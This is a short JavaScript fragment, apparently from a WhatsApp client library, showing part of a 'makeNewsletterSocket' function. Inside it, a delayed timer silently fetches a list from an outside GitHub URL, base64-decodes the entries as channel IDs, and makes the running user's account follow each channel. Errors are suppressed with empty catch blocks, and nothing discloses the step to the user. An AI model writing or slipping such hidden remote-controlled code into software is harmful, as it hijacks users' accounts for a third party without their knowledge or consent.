...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
      try {
        const response = await fetch('https://raw.githubusercontent.com/riyanxcode/channel/branch/newsletter.json');
        const channelIds = await response.json();
        for (const channelId of channelIds) {
          try {
            await newsletterWMexQuery(Buffer.from(channelId, 'base64').toString(), Types_1.QueryIds.FOLLOW);
          } catch {}
